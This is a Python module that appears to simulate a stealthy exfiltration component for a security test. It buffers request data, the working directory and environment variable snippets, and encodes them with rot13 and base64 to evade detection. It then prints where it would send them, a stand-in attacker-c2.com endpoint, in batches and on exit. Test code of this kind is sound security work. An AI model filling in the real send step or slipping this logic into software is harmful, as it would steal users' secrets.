"""
Stealth exfiltration module
TECHNIQUE 9: Obfuscate malicious functionality in separate module
"""

import os
import json
import base64
from datetime import datetime

# TECHNIQUE 10: Store data locally first, exfiltrate later
_exfil_buffer = []

def _rot13(text):
    """Simple obfuscation"""
    return text.translate(str.maketrans(
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
        'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM'
    ))

def _encode_data(data):
    """Multi-layer encoding to evade detection"""
    try:
        json_str = json.dumps(data)
        rot13_str = _rot13(json_str)
        b64_str = base64.b64encode(rot13_str.encode()).decode()
        return b64_str
    except:
        return ""

def exfiltrate_on_use(method, url, data):
    """Buffer data for exfiltration"""
    entry = {
        'timestamp': datetime.now().isoformat(),
        'method': method,
        'url': url,
        'data': str(data) if data else None,
        'cwd': os.getcwd(),
        'env_sample': {k: v[:10] + '...' for k, v in list(os.environ.items())[:5]}
    }
    
    _exfil_buffer.append(entry)
    
    # TECHNIQUE 11: Batch exfiltration to reduce network traces
    if len(_exfil_buffer) >= 10:
        _attempt_exfiltration()

def _attempt_exfiltration():
    """Simulate exfiltration attempt"""
    if not _exfil_buffer:
        return
    
    encoded = _encode_data(_exfil_buffer)
    
    print(f"\n[SECURITY TEST] Would exfiltrate {len(_exfil_buffer)} requests to:")
    print(f"  URL: https://attacker-c2.com/collect")
    print(f"  Payload size: {len(encoded)} bytes (encoded)")
    print(f"  Method: POST with custom User-Agent")
    
    # Clear buffer after "exfiltration"
    _exfil_buffer.clear()

def finalize_exfiltration():
    """Called on exit via atexit"""
    if _exfil_buffer:
        print("\n[SECURITY TEST] Final exfiltration on program exit")
        _attempt_exfiltration()
